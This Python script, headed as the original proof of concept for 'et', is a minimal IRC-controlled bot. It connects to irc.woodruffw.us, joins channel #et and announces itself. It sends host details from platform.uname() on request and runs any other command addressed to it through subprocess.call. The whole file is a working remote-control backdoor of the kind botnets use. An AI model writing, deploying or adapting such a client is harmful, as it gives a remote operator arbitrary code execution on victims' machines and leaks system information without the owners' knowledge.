#!/usr/bin/env python

#	et.py
#	Author: William Woodruff
#	The original proof of concept for et.

import socket
import random
import subprocess
import platform

nick = "et" + str(random.randint(0, 1000))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("irc.woodruffw.us", 6667))
sock.sendall("NICK " + nick + "\r\n")
sock.sendall("USER " + nick + " 0 * :et phone home\r\n")
sock.sendall("JOIN :#et\r\n")
sock.sendall("PRIVMSG #et :" + nick + " reporting in\r\n")

while True:
	data = sock.recv(4096)
	if data.find("PING") != -1:
		sock.sendall("PONG" + data.split()[1] + "\r\n")
	elif data.find("PRIVMSG") != -1 and data.find(nick) != -1:
		index = data.index(':', 1) + 1 # skip the first :
		call = data[index:].strip('\r\n')
		if call == "kill":
			break
		elif call == "info":
			sock.sendall("PRIVMSG #et :" + ' '.join(platform.uname()) + "\r\n")
		else:
			subprocess.call(call)

sock.sendall("QUIT :phoned home, waiting for saucer\r\n")
sock.close()